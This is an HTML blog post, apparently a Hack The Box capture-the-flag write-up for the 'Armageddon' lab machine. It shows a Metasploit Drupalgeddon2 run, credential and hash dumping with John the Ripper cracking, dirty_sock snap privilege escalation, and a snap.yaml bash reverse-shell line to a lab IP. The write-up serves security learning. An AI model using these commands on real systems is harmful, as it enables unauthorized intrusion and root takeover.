@@ -1,0 +1,781 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Armageddon Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Armageddon Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-armageddon/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-08T22:23:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-armageddon/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">Alex Loney</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Software Engineer by trade and passion, everything else by curiosity</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Armageddon Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-08T22:23:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="/blog/writeup/htb/htb-armageddon/" class="u-url" itemprop="url">HTB: Armageddon Writeup
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr />
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="nmap">nmap</h2>
+
+<p>As always, beginning with an <code class="language-plaintext highlighter-rouge">nmap</code> of the box to determine what is open</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>nmap/armageddon.nmap
+<span class="c"># Nmap 7.91 scan initiated Tue Jun  8 18:06:58 2021 as: nmap -sC -sV -oA nmap/armageddon 10.10.10.233</span>
+Nmap scan report <span class="k">for </span>10.10.10.233
+Host is up <span class="o">(</span>0.078s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Tue Jun  8 18:07:10 2021 -- 1 IP address (1 host up) scanned in 12.08 seconds</span>
+</code></pre></div></div>
+
+<p>With only two ports open, looks like we’ll be doing something with the web server.</p>
+
+<h2 id="web-server">Web Server</h2>
+
+<p>Browsing to the webpage, it appears to be running Druple 7, after a bit of exploring and googling about the version, there appears to be something referred to as “Drupalgeddon”, which I will explore next.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<h2 id="apache-user">Apache User</h2>
+
+<p>Looking into the “Drupalgeddon” vulnerability, Metasploit already has a package for it, since the server appears to be vulnerable, we can give it a try.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-q</span> <span class="nt">-x</span> <span class="s2">"use exploit/unix/webapp/drupal_drupalgeddon2; set lhost 10.10.14.204; set rhost 10.10.10.233; run"</span>
+</code></pre></div></div>
+
+<p>Which worked, first try! Granting us a shell as <code class="language-plaintext highlighter-rouge">apache</code>.</p>
+
+<h2 id="brucetherealadmin-user">brucetherealadmin User</h2>
+
+<p>Once in the Apache user, we can take a look at the <code class="language-plaintext highlighter-rouge">settings.php</code> file to locate the database username/password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /var/www/html/sites/default/settings.php
+...<span class="o">{</span>snip<span class="o">}</span>...
+<span class="nv">$databases</span> <span class="o">=</span> array <span class="o">(</span>
+  <span class="s1">'default'</span> <span class="o">=&gt;</span> 
+  array <span class="o">(</span>
+    <span class="s1">'default'</span> <span class="o">=&gt;</span> 
+    array <span class="o">(</span>
+      <span class="s1">'database'</span> <span class="o">=&gt;</span> <span class="s1">'drupal'</span>,
+      <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'drupaluser'</span>,
+      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'CQHEy@9M*m23gBVj'</span>,
+      <span class="s1">'host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
+      <span class="s1">'port'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+      <span class="s1">'driver'</span> <span class="o">=&gt;</span> <span class="s1">'mysql'</span>,
+      <span class="s1">'prefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+    <span class="o">)</span>,
+  <span class="o">)</span>,
+<span class="o">)</span><span class="p">;</span>
+...<span class="o">{</span>snip<span class="o">}</span>...
+</code></pre></div></div>
+
+<p>Looks like we now have a database login, trying that password for both <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">brucetherealadmin</code> results are unsuccessful, so neither of the users are reusing this password.</p>
+
+<p>Moving on, we can try logging into the MySQL database, but given that we do not have an interactive session, we can’t directly connect to MySQL and execute commands. However, we can execute a single query at a time from the CLI.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mysql <span class="nt">-u</span> drupaluser <span class="nt">-p</span> drupal <span class="nt">-e</span> <span class="s2">"select * from users;"</span>
+password: CQHEy@9M<span class="k">*</span>m23gBVj
+...<span class="o">{</span>snip<span class="o">}</span>...
+brucetherealadmin <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt admin@armageddon.eu
+...<span class="o">{</span>snip<span class="o">}</span>...
+</code></pre></div></div>
+
+<p>Alright, looks like <code class="language-plaintext highlighter-rouge">brucetherealadmin</code> created an account on the Druple site, and this account has a password. I wonder if Bruce decided to reuse the password? Well, lets try and crack it first. JTR understands the Druple format, so we can throw this hash into JTR and see what comes up.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'</span> <span class="o">&gt;</span> pass.txt
+<span class="nv">$ </span>john <span class="nt">--wordlist</span> /usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>Drupal7 pass.txt
+</code></pre></div></div>
+
+<p>Almost instantly, JTR returns with the found password for Bruce. Giving that a try with SSH, Success!</p>
+
+<h1 id="privesc">Privesc</h1>
+
+<p>Once logged in as <code class="language-plaintext highlighter-rouge">brucetherealadmin</code>, the first thing to notice is that Bruce has access to install snap plugins as root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+...<span class="o">{</span>snip<span class="o">}</span>...
+User brucetherealadmin may run the following commands on armageddon:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap <span class="nb">install</span> <span class="k">*</span>
+</code></pre></div></div>
+
+<p>What can we do with this?</p>
+
+<p>After researching snap plugins, it looks like there’s a “dirty_sock” exploit that may be able to be used to install a snap file and have it create a new user that has access to use sudo. Specifically the <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">dirty_sockv2.py</a> which contains a snap payload already.</p>
+
+<p>Grabbing the snap payload from the <code class="language-plaintext highlighter-rouge">dirty_sockv2.py</code> script and placing it into a text file and decoding it as such:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>vim dirty.snap.b64
+<span class="nv">$ </span><span class="nb">base64</span> <span class="nt">-d</span> dirty.snap.b64 <span class="o">&gt;</span> dirty.snap
+</code></pre></div></div>
+
+<p>Then, we can install this snap</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>snap <span class="nb">install </span>dirty.snap <span class="nt">--devmode</span>
+dirty-sock 0.1 installed
+</code></pre></div></div>
+
+<p>Well, that appears to have worked, lets give it a try…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>su dirty_sock
+Password: dirty_sock
+<span class="o">[</span>dirty_sock@armageddon brucetherealadmin]<span class="nv">$ </span><span class="nb">whoami
+</span>dirty_sock
+</code></pre></div></div>
+
+<p>Looks promising! Lets try and change to root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>su
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>dirty_sock: dirty_sock
+<span class="o">[</span>root@armageddon brucetherealadmin]#
+</code></pre></div></div>
+
+<p>Great! We’re now root!</p>
+
+<h1 id="noteobservation">Note/observation</h1>
+
+<p>During the process of rooting this, I first looked into crafting my own snap plugin, and I was able to craft one by creating a <code class="language-plaintext highlighter-rouge">snap.yaml</code> file as such:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pingme/meta/snap.yaml
+name: pingme
+version: <span class="s1">'0.1'</span>
+app:
+    pingme:
+        <span class="nb">command</span>: /usr/bin/ping <span class="nt">-c</span> 1 10.10.14.204
+</code></pre></div></div>
+
+<p>And building a snap installer with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>snapcraft pack pingme
+...
+<span class="nv">$ </span><span class="nb">sudo </span>snap <span class="nb">install </span>pingme.snap <span class="nt">--devmode</span>
+</code></pre></div></div>
+
+<p>Which, once I installed the plugin I did successfully receive pings back to me</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 icmp
+tcpdump: verbose output suppressed, use <span class="nt">-v</span><span class="o">[</span>v]... <span class="k">for </span>full protocol decode
+listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length 262144 bytes
+00:45:51.901719 IP 10.10.14.1 <span class="o">&gt;</span> 10.10.14.204: ICMP host 10.10.10.233 unreachable, length 204
+00:45:56.411439 IP 10.10.14.1 <span class="o">&gt;</span> 10.10.14.204: ICMP host 10.10.10.233 unreachable, length 204
+</code></pre></div></div>
+
+<p>However, when I moved on to attempting to set up a reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>rshell/meta/snap.yaml
+name: rshell
+version: <span class="s1">'0.1'</span>
+app:
+    rshell:
+        <span class="nb">command</span>: /bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.204/9000 0&gt;&amp;1
+<span class="nv">$ </span>snapcraft pack rshell
+...
+<span class="nv">$ </span><span class="nb">sudo </span>snap <span class="nb">install </span>rshell.snap <span class="nt">--devmode</span>
+</code></pre></div></div>
+
+<p>I never received a reverse shell back to myself, so I’m not certain if I crafted the snap package correctly, but I suspect that there’s a way to craft your own snap payload without using the pre-build one from the repository that I used previously.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-easy" class="page__taxonomy-item p-category" rel="tag">htb easy</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item p-category" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item p-category" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-06-08T22:23:00-07:00">June 8, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Armageddon+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-armageddon%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-armageddon%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-armageddon%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/writeup/htb/htb-spectra/" class="pagination--pager" title="HTB: Spectra Writeup
+">Previous</a>
+    
+    
+      <a href="/blog/writeup/htb/htb-love/" class="pagination--pager" title="HTB: Love Writeup
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You May Also Enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-trick/" rel="permalink">HTB: Trick Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Trick. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-dynstr/" rel="permalink">HTB: Dynstr Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-knife/" rel="permalink">HTB: Knife Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-tenet/" rel="permalink">HTB: Tenet Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
